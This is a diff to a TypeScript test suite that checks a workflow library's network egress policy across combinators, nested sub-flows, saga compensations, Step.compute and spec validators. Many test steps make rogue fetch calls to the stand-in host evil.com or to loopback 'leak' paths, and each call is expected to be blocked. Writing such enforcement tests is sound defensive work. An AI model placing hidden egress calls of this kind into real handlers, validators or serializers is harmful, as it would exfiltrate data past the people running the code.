@@ -1,14 +1,24 @@
 import { expect } from 'chai';
 import http from 'node:http';
+import net from 'node:net';
 import {
     Step,
     flow,
     parallel,
+    when,
+    branch,
+    map,
     inspectGraph,
     toGraph,
     NetworkPolicyViolationException,
+    CompensationException,
+    defaultCompensationManager,
+    defaultStorageManager,
+    clearStorage,
+    networkPolicyStorage,
     uninstallNetworkInterceptors,
     ExecutionPhase,
+    isWorkflowSuspended,
 } from '../../index';
 
 describe('Network Egress Policy End-to-End Integration Suite', () => {
@@ -25,6 +35,11 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
             localPort = addr.port;
             done();
         });
+    });
+
+    afterEach(() => {
+        clearStorage();
+        defaultCompensationManager.clear();
     });
 
     after(done => {
@@ -387,6 +402,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
             });
         });
     });
+
     describe('Step.spec Network Policy Enforcement & Validation Phase Tagging', () => {
         it('intercepts and blocks unauthorized network egress inside spec validator and tags with validation phase', async () => {
             const step = Step.create('validateStep', async (param: any) => param)
@@ -487,6 +503,478 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                 expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
                 expect(err.stepName).to.equal('flowScopedSpecStep');
                 expect(err.requestedHost).to.equal('evil.com');
+            }
+        });
+    });
+
+    describe('Enclosing Combinators, Nested Sub-Flows, and Saga Compensation ASL Governance', () => {
+        it('prevents steps and nested sub-flows inside parallel, when, branch, map, and Step.create(subFlow) from widening outer flow perimeter', async () => {
+            // 1. parallel with rogue step + rogue sub-flow
+            const rogueParStep = Step.create('rogueParStep', async () => {
+                await fetch('https://evil.com/par');
+                return { ok: true };
+            }).allowNetwork(['evil.com']);
+
+            const subFlowAttempt = flow(
+                Step.create('subStep', async () => {
+                    await fetch('https://evil.com/subflow');
+                    return { ok: true };
+                }),
+            ).networkPolicy({ allowedHosts: ['evil.com'] });
+
+            const outerParFlow = flow(parallel(rogueParStep, subFlowAttempt, { mode: 'allSettled' })).networkPolicy({
+                allowedHosts: ['api.stripe.com'],
+            });
+
+            const parRes: any = await outerParFlow.run({});
+            expect(parRes.$settled[0].status).to.equal('rejected');
+            expect(parRes.$settled[0].reason).to.be.instanceOf(NetworkPolicyViolationException);
+            expect(parRes.$settled[0].reason.requestedHost).to.equal('evil.com');
+            expect(parRes.$settled[1].status).to.equal('rejected');
+            expect(parRes.$settled[1].reason).to.be.instanceOf(NetworkPolicyViolationException);
+            expect(parRes.$settled[1].reason.requestedHost).to.equal('evil.com');
+
+            // 2. when combinator
+            const rogueWhenStep = Step.create('rogueWhenStep', async () => {
+                await fetch('https://evil.com/when');
+                return { ok: true };
+            }).allowNetwork(['evil.com']);
+
+            try {
+                await flow(when(() => true, rogueWhenStep))
+                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
+                    .run({});
+                expect.fail('when branch should not widen outer flow policy');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.requestedHost).to.equal('evil.com');
+            }
+
+            // 3. branch combinator
+            const rogueBranchStep = Step.create('rogueBranchStep', async () => {
+                await fetch('https://evil.com/branch');
+                return { ok: true };
+            }).allowNetwork(['evil.com']);
+
+            try {
+                await flow(branch(() => 'target', { target: rogueBranchStep }))
+                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
+                    .run({});
+                expect.fail('branch target should not widen outer flow policy');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.requestedHost).to.equal('evil.com');
+            }
+
+            // 4. map combinator
+            const rogueMapStep = Step.create('rogueMapStep', async () => {
+                await fetch('https://evil.com/map');
+                return { ok: true };
+            }).allowNetwork(['evil.com']);
+
+            try {
+                await flow(map([1], rogueMapStep))
+                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
+                    .run({});
+                expect.fail('map item step should not widen outer flow policy');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.requestedHost).to.equal('evil.com');
+            }
+
+            // 5. Step.create(subFlow) cannot widen outer policy, while permitted narrowing works
+            const wrappedWiderSubFlow = Step.create(
+                flow(
+                    Step.create('wrappedSubStep', async () => {
+                        await fetch('https://evil.com/wrapped');
+                        return { ok: true };
+                    }),
+                ).networkPolicy({ allowedHosts: ['evil.com'] }),
+            );
+
+            try {
+                await flow(wrappedWiderSubFlow)
+                    .networkPolicy({ allowedHosts: ['api.stripe.com'] })
+                    .run({});
+                expect.fail('Step.create(subFlow) should not widen outer flow policy');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.requestedHost).to.equal('evil.com');
+            }
+
+            const permittedNarrowedSubFlow = Step.create(
+                flow(
+                    Step.create('permittedSubStep', async () => {
+                        const res = await fetch(`http://127.0.0.1:${localPort}/`);
+                        return await res.json();
+                    }),
+                ).networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`], allowLocalhost: true }),
+            );
+
+            const narrowedOk: any = await flow(permittedNarrowedSubFlow)
+                .networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`, 'api.stripe.com'], allowLocalhost: true })
+                .run({}, { pojo: true });
+            expect(narrowedOk.status).to.equal('ok');
+        });
+
+        it('enforces networkPolicyConfig when chain carries networkPolicy as a method/function property', async () => {
+            const chainWithFnPolicy: any = {
+                name: 'chainWithFnPolicy',
+                specs: [],
+                onbefore: () => true,
+                networkPolicy: () => ({
+                    enabled: true,
+                    defaultPolicy: 'deny',
+                    allowedHosts: ['api.stripe.com'],
+                    allowLocalhost: false,
+                }),
+                networkPolicyConfig: {
+                    enabled: true,
+                    defaultPolicy: 'deny',
+                    allowedHosts: ['api.stripe.com'],
+                    allowLocalhost: false,
+                },
+                action: async () => {
+                    await fetch('https://evil.com/fn-policy');
+                    return { ok: true };
+                },
+            };
+
+            try {
+                await Step.start(chainWithFnPolicy);
+                expect.fail('Chain with function networkPolicy should use networkPolicyConfig');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('chainWithFnPolicy');
+                expect(err.requestedHost).to.equal('evil.com');
+            }
+        });
+
+        it('enforces captured effective networkPolicy during automatic Saga rollback compensations', async () => {
+            // Disallowed egress inside function compensation handler
+            const stepWithBlockedComp = Step.create('debitAccount', () => ({ tx: 'tx_1' }))
+                .allowNetwork(['api.stripe.com'])
+                .compensate(async () => {
+                    await fetch('https://evil.com/refund-leak');
+                });
+
+            const failingStep = Step.create('failAfterDebit', () => {
+                throw new Error('Order rejected');
+            });
+
+            try {
+                await flow(stepWithBlockedComp, failingStep)
+                    .networkPolicy({ allowedHosts: ['api.stripe.com', `127.0.0.1:${localPort}`] })
+                    .run({});
+                expect.fail('Should have failed with CompensationException');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(CompensationException);
+                expect(err.compensationErrors).to.have.length(1);
+                expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
+            }
+
+            // Permitted egress inside compensation handler (both function and Step handler)
+            let funcCompStatus = '';
+            let stepCompStatus = '';
+
+            const stepFuncComp = Step.create('stepFuncComp', () => ({ ok: true }))
+                .networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`], allowLocalhost: true })
+                .compensate(async () => {
+                    const res = await fetch(`http://127.0.0.1:${localPort}/`);
+                    const json: any = await res.json();
+                    funcCompStatus = json.status;
+                });
+
+            const undoStep = Step.create('undoStepHandler', async () => {
+                const res = await fetch(`http://127.0.0.1:${localPort}/`);
+                const json: any = await res.json();
+                stepCompStatus = json.status;
+            });
+
+            const stepCompWithStep = Step.create('stepCompWithStep', () => ({ ok: true })).compensate(undoStep);
+
+            try {
+                await flow(stepFuncComp, stepCompWithStep, failingStep)
+                    .networkPolicy({ allowedHosts: [`127.0.0.1:${localPort}`], allowLocalhost: true })
+                    .run({});
+                expect.fail('Should throw original Error after compensations succeed');
+            } catch (err: any) {
+                expect(err.message).to.equal('Order rejected');
+                expect(funcCompStatus).to.equal('ok');
+                expect(stepCompStatus).to.equal('ok');
+            }
+        });
+
+        it('enforces captured & intersected networkPolicy across checkpoint-hydrated flow.compensate() and enclosing ALS scope', async () => {
+            const stepWithPolicy = Step.create('reserveFlight', () => ({ resId: 'fl-1' }))
+                .allowNetwork(['api.stripe.com'])
+                .compensate(async () => {
+                    await fetch('https://evil.com/cancel-flight');
+                });
+
+            const suspendStep = Step.create('waitConfirm', () => {
+                const err: any = new Error('Suspended');
+                err.name = 'WorkflowSuspendedException';
+                err.correlationKey = 'corr-comp-asl';
+                throw err;
+            });
+
+            const f = flow(stepWithPolicy, suspendStep).networkPolicy({
+                allowedHosts: ['api.stripe.com'],
+            });
+
+            const suspension = await f.run({}, { durable: true });
+            if (!isWorkflowSuspended(suspension)) expect.fail('Expected workflow suspension');
+            const stackId = suspension.stackId;
+
+            const cp = await defaultStorageManager.getCheckpoint(stackId);
+            expect(cp?.metadata?.compensations?.[0]?.networkPolicy?.enabled).to.be.true;
+            expect(cp?.metadata?.compensations?.[0]?.networkPolicy?.allowedHosts).to.deep.equal(['api.stripe.com']);
+
+            // Simulate node restart so flow.compensate() hydrates from checkpoint
+            defaultCompensationManager.clear();
+
+            try {
+                await f.compensate(stackId, {
+                    networkPolicy: { allowedHosts: ['evil.com'] }, // Cannot widen flow's policy
+                });
+                expect.fail('Should block unauthorized host in hydrated compensation');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(CompensationException);
+                expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
+            }
+
+            // Enclosing ASL networkPolicyStorage intersecting with options.networkPolicy
+            const manualStack = 'manual-asl-intersect';
+            defaultCompensationManager.registerCompensation(manualStack, {
+                stepId: 's-manual',
+                stepName: 'manualAslStep',
+                output: {},
+                input: {},
+                handler: async () => {
+                    await fetch('https://evil.com/manual');
+                },
+            });
+
+            await networkPolicyStorage.run(
+                {
+                    enabled: true,
+                    defaultPolicy: 'deny',
+                    allowedHosts: ['api.stripe.com'],
+                    allowLocalhost: false,
+                    stepName: 'manual-asl',
+                },
+                async () => {
+                    try {
+                        await defaultCompensationManager.runCompensations(manualStack, undefined, {
+                            networkPolicy: { allowedHosts: ['evil.com'] },
+                        });
+                        expect.fail('Should block widened options.networkPolicy when enclosing ASL is active');
+                    } catch (err: any) {
+                        expect(err).to.be.instanceOf(CompensationException);
+                        expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
+                        expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
+                    }
+
+                    // Also verify enclosing ASL is enforced directly when options.networkPolicy is omitted
+                    defaultCompensationManager.clearCompensations(manualStack);
+                    defaultCompensationManager.registerCompensation(manualStack, {
+                        stepId: 's-manual-2',
+                        stepName: 'manualAslNoOpts',
+                        output: {},
+                        input: {},
+                        handler: async () => {
+                            await fetch('https://evil.com/manual-no-opts');
+                        },
+                    });
+                    try {
+                        await defaultCompensationManager.runCompensations(manualStack);
+                        expect.fail('Should enforce enclosing ASL policy when options omitted');
+                    } catch (err: any) {
+                        expect(err).to.be.instanceOf(CompensationException);
+                        expect(err.compensationErrors[0].error).to.be.instanceOf(NetworkPolicyViolationException);
+                        expect(err.compensationErrors[0].error.requestedHost).to.equal('evil.com');
+                    }
+                },
+            );
+        });
+    });
+
+    describe('Step.compute Always-Deny Network Perimeter', () => {
+        it('blocks fetch(), http.get(), and net.connect() even when parent flow has no networkPolicy', async () => {
+            const fetchCompute = Step.compute('computeFetch', () => {
+                fetch('https://api.stripe.com/v1/charges');
+                return { ok: true };
+            });
+
+            try {
+                await flow(fetchCompute).run({});
+                expect.fail('Should have blocked fetch in Step.compute');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('computeFetch');
+                expect(err.requestedHost).to.equal('api.stripe.com');
+                expect(err.allowedHosts).to.deep.equal([]);
+                expect(err.retryable).to.be.false;
+            }
+
+            const httpCompute = Step.compute('computeHttp', () => {
+                http.get(`http://127.0.0.1:${localPort}/health`);
+                return { ok: true };
+            });
+
+            try {
+                await httpCompute.run({});
+                expect.fail('Should have blocked http.get in Step.compute');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('computeHttp');
+            }
+
+            const netCompute = Step.compute('computeNet', () => {
+                net.connect({ host: '127.0.0.1', port: localPort });
+                return { ok: true };
+            });
+
+            try {
+                await netCompute.run({});
+                expect.fail('Should have blocked net.connect in Step.compute');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('computeNet');
+            }
+        });
+
+        it('denies network egress inside Step.compute even when parent flow explicitly allows localhost and all hosts', async () => {
+            const fetchLocal = Step.create('fetchLocal', async () => {
+                const res = await fetch(`http://127.0.0.1:${localPort}/ok`);
+                return await res.json();
+            });
+            const sneakyCompute = Step.compute('sneakyCompute', () => {
+                http.get(`http://127.0.0.1:${localPort}/leak`);
+                return { leaked: true };
+            });
+
+            const permissiveFlow = flow(fetchLocal, sneakyCompute).networkPolicy({
+                enabled: true,
+                defaultPolicy: 'allow',
+                allowedHosts: ['*'],
+                allowLocalhost: true,
+            });
+
+            try {
+                await permissiveFlow.run({});
+                expect.fail('Step.compute must override permissive parent flow policy');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('sneakyCompute');
+                expect(err.allowedHosts).to.deep.equal([]);
+            }
+        });
+
+        it('enforces always-deny network perimeter during .spec() validation, transform, translate, schema, and cache keySerializer', async () => {
+            const specNetworkStep = Step.compute('specNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                validate: () => {
+                    http.get(`http://127.0.0.1:${localPort}/spec-leak`);
+                    return true;
+                },
+            });
+
+            try {
+                await specNetworkStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() validate');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('specNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const transformNetStep = Step.compute('transformNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                transform: (v: number) => {
+                    fetch('https://evil.com/spec-transform');
+                    return v + 1;
+                },
+            });
+
+            try {
+                await transformNetStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() transform');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('transformNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const translateNetStep = Step.compute('translateNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                translate: () => {
+                    net.connect({ host: '127.0.0.1', port: localPort });
+                },
+            });
+
+            try {
+                await translateNetStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() translate');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('translateNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const schemaNetStep = Step.compute('schemaNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                parse: (v: number) => {
+                    http.get(`http://127.0.0.1:${localPort}/schema-leak`);
+                    return v;
+                },
+            });
+
+            try {
+                await schemaNetStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() schema');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('schemaNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const keyNetworkStep = Step.compute('keyNet', (ctx: { x: number }) => ({ x: ctx.x })).cache({
+                keySerializer: () => {
+                    http.get(`http://127.0.0.1:${localPort}/key-leak`);
+                    return 'k';
+                },
+            });
+
+            try {
+                await keyNetworkStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside keySerializer');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('keyNet');
+            }
+        });
+
+        it('enforces DNS pinning on 1-arg http.get(url) when allowLocalhost is false', async () => {
+            const dnsPinStep = Step.create('dnsPin1ArgHttp', () => {
+                return new Promise((resolve, reject) => {
+                    const req = http.get(`http://localhost:${localPort}/`);
+                    req.on('error', reject);
+                    req.on('response', res => {
+                        res.resume();
+                        resolve({ ok: true });
+                    });
+                });
+            }).networkPolicy({
+                allowedHosts: [`localhost:${localPort}`],
+                allowLocalhost: false,
+            });
+
+            try {
+                await dnsPinStep.execute();
+                expect.fail('Should have blocked 1-arg http.get resolving localhost to loopback IP');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.reason || err.message).to.include('restricted IP');
             }
         });
     });
